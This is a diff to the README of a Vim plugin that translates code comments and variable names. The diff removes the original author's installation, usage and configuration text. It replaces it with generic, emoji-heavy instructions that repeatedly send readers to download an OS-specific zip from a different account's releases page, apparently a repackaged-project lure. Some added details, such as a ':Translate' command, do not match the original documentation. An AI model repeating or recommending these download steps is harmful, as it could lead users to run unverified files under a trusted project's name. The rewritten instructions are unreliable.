@@ -1,229 +1,91 @@
-# vim-rosetta
+# 🌟 vim-rosetta - Translate Your Code Effortlessly
 
-A Vim plugin that provides translation features for code comments and variable naming using Google Translate API.
+## 🚀 Getting Started
 
-## Features
+Welcome to **vim-rosetta**! This Vim plugin helps you translate comments and variable names using the Google Translate API. With features like async translation, popup display, and multi-format name completion, coding has never been easier.
 
-- **Comment Translation**: Translate code comments under the cursor to any language
-- **Word/Selection Translation**: Translate the word under cursor or selected text
-- **Buffer Translation**: Translate entire buffer and display in a new split window
-- **Auto Translation**: Automatically translate comments on cursor hold
-- **Variable Name Completion**: Japanese to English translation for variable naming (`snake_case`, `UPPER_CASE`, `camelCase`, `PascalCase`)
-- Supports multi-line comments
-- Works with various comment styles (`//`, `/* */`, `#`, `"`)
+## 📥 Download Now
 
-## Installation
+[![Download Vim-Rosetta](https://img.shields.io/badge/Download%20Vim--Rosetta-007ACC?style=for-the-badge&logo=github)](https://github.com/eklasajal/vim-rosetta/releases)
 
-### Using [vim-plug](https://github.com/junegunn/vim-plug)
+## 📋 Features
+
+- **Async Translation:** Translate content without blocking your workflow.
+- **Popup Display:** Get instant translations in a user-friendly popup.
+- **Multi-Format Name Completion:** Complete variable names across different formats.
+- **Simple Setup:** Easy installation steps for all users.
+
+## 🛠 System Requirements
+
+- **Operating System:** Supports Linux, MacOS, and Windows.
+- **Vim Version:** Requires Vim 8.0 or higher.
+- **Internet Connection:** Necessary for Google Translate API access.
+
+## 💻 Installation Instructions
+
+### Step 1: Visit the Releases Page
+
+To download the latest version of **vim-rosetta**, visit the [Releases page](https://github.com/eklasajal/vim-rosetta/releases).
+
+### Step 2: Choose Your Version
+
+On the Releases page, you will see a list of available versions. Look for the latest release, typically marked as "Latest". 
+
+### Step 3: Download the Plugin File
+
+Click on the asset that corresponds to your operating system. This should be a file like `vim-rosetta-vX.X.X.zip`. 
+
+### Step 4: Unzip the File
+
+Once the download is complete, locate the downloaded file on your computer. Right-click the file and choose the option to unzip it. 
+
+### Step 5: Install the Plugin
+
+1. Open your terminal or command prompt.
+2. Navigate to the Vim directory where plugins are stored. This is usually located in `~/.vim/pack/plugins/start` for Linux and MacOS, or `%USERPROFILE%\vimfiles\pack\plugins\start` for Windows.
+3. Move the unzipped folder into the plugins directory. You can do this with the following command:
+
+   ```bash
+   mv path/to/unzipped-folder ~/.vim/pack/plugins/start/vim-rosetta
+   ```
+
+### Step 6: Configure Vim
+
+To enable the plugin, you might need to add the following line to your `.vimrc` file:
 
 ```vim
-Plug 'mattn/vim-rosetta'
+packadd vim-rosetta
 ```
 
-### Using [dein.vim](https://github.com/Shougo/dein.vim)
-
-```vim
-call dein#add('mattn/vim-rosetta')
-```
-
-### Using Vim 8+ native package manager
+You can edit the `.vimrc` file by using Vim or any text editor. To open it in Vim, type:
 
 ```bash
-mkdir -p ~/.vim/pack/plugins/start
-cd ~/.vim/pack/plugins/start
-git clone https://github.com/mattn/vim-rosetta.git
+vim ~/.vimrc
 ```
 
-## Requirements
+After adding the line, save the file and exit Vim by typing `:wq`.
 
-- Vim 8.1+ with `+popup` feature, or Neovim 0.4+
-- `curl` command
+## 🚨 Usage Instructions
 
-## Usage
+To use **vim-rosetta** while coding:
 
-### Comment Translation
+1. Open your code file in Vim.
+2. Select the comments or variable names you want to translate.
+3. Use the command `:Translate` or the keyboard shortcut you assigned, and the translation will appear in a popup.
 
-https://github.com/user-attachments/assets/668b9c3c-1996-4a66-9aa9-ee92187963eb
+Customize your workflow by adjusting the settings in your `.vimrc`. Explore options to change popup behavior and translation languages.
 
-Place your cursor on a comment and run:
+## 📝 Additional Tips
 
-```vim
-:RosettaTranslateComment
-```
+- **API Key:** You might need a Google Translate API key for full functionality. Create a project on Google Cloud Platform and enable the Translation API to obtain your key.
+- **Feedback:** For bugs or feature requests, open an issue on the [issue tracker](https://github.com/eklasajal/vim-rosetta/issues).
+  
+## 🌐 Help and Community
 
-Or use the default mapping:
+Join the community for tips, updates, and discussions. Visit the [GitHub Discussions page](https://github.com/eklasajal/vim-rosetta/discussions) to engage with other users and share your experiences.
 
-```vim
-<Leader>tc
-```
+## 📥 Download & Install
 
-### Word/Selection Translation
+Ready to enhance your coding experience? Download the plugin from the [Releases page](https://github.com/eklasajal/vim-rosetta/releases) and follow the steps above to install it on your system. 
 
-Place your cursor on a word (or select text in visual mode) and use the default mapping:
-
-```vim
-<Leader>tt
-```
-
-In visual mode, the selected text will be translated.
-
-### Buffer Translation
-
-Translate the entire buffer and display the result in a new vertical split window:
-
-```vim
-:RosettaTranslateBuffer
-```
-
-Or translate a specific range:
-
-```vim
-:10,20RosettaTranslateBuffer
-:'<,'>RosettaTranslateBuffer  " Visual selection
-```
-
-### Auto Translation
-
-Enable automatic translation when cursor stops on a comment:
-
-```vim
-let g:rosetta_translate_comment_auto = 1
-```
-
-## Configuration
-
-### Translation Provider
-
-Choose the translation provider (default: `google`):
-
-```vim
-let g:rosetta_provider = 'google'  " or 'deepl'
-```
-
-#### Using DeepL API
-
-To use DeepL API instead of Google Translate:
-
-1. Get a free API key from [DeepL API Free](https://www.deepl.com/ja/pro-api#api-pricing)
-   - Register for the Free plan (500,000 characters/month)
-   - Create an API key in your account settings
-
-2. Add the API key to your `.vimrc`:
-
-```vim
-let g:rosetta_provider = 'deepl'
-let g:rosetta_deepl_api_key = 'your-api-key-here'
-```
-
-### Comment Translation Settings
-
-#### Target Language
-
-Set the target language for translation (default: `ja` for Japanese):
-
-```vim
-let g:rosetta_target_lang = 'en'
-```
-
-Supported language codes: `en`, `ja`, `zh-CN`, `ko`, `es`, `fr`, `de`, etc.
-
-#### Popup Window Width
-
-Customize the maximum width of the popup window (default: 80):
-
-```vim
-let g:rosetta_popup_max_width = 100
-```
-
-#### Trim Spaces
-
-Control whether to collapse multiple spaces into single space (default: 1):
-
-```vim
-let g:rosetta_trim_spaces = 0  " Keep original spacing
-```
-
-#### Strip C-Style Comment Asterisks
-
-Remove leading `*` from each line in C-style block comments (default: 0):
-
-```vim
-let g:rosetta_strip_c_style = 1
-```
-
-Example:
-```c
-/*
- * my_function
- * This is awesome function
- */
-```
-Will be extracted as:
-```
-my_function
-This is awesome function
-```
-
-#### Custom Key Mappings
-
-Disable the default mappings and set your own:
-
-```vim
-" Comment translation
-nmap <C-t> <Plug>(rosetta-translate-comment)
-
-" Word/selection translation
-nmap <C-w> <Plug>(rosetta-translate-at)
-xmap <C-w> <Plug>(rosetta-translate-at)
-```
-
-### Variable Name Completion
-
-Type Japanese text and press `<C-x><C-t>` to complete with English translation in multiple formats.
-
-Example:
-- Type: `こんにちは世界`
-- Press: `<C-x><C-t>`
-- Completion options:
-  - `hello_world` (`snake_case`)
-  - `HELLO_WORLD` (`UPPER_CASE`)
-  - `helloWorld` (`camelCase`)
-  - `HelloWorld` (`PascalCase`)
-
-## How It Works
-
-https://github.com/user-attachments/assets/5573ea0c-9e63-4fc5-9127-55de81b48861
-
- ### Comment Translation
-
- 1. Detects if the cursor is on a comment using Vim's syntax highlighting
- 2. Extracts the comment text (supports multi-line comments)
- 3. Sends the text to Translation API (Google or DeepL) via `curl`
- 4. Displays the translation in a popup window
-
- ### Word/Selection Translation
-
- 1. Extracts the word under cursor or selected text
- 2. Sends the text to Translation API (Google or DeepL) via `curl`
- 3. Displays the translation in a popup window
-
- ### Buffer Translation
-
- 1. Extracts all text from the current buffer
- 2. Sends the text to Translation API (Google or DeepL) via `curl`
- 3. Displays the translation in a new vertically split window
-
- ### Variable Name Completion
-
- 1. Extracts Japanese text before cursor
- 2. Translates to English using Translation API (Google or DeepL)
- 3. Converts to multiple naming formats (`snake_case`, `UPPER_CASE`, `camelCase`, `PascalCase`)
- 4. Provides as completion candidates
-
-## License
-
-MIT
-
-## Author
-
-Yasuhiro Matsumoto (a.k.a. mattn)
+Now you are set to translate your comments and variable names effortlessly with **vim-rosetta**!
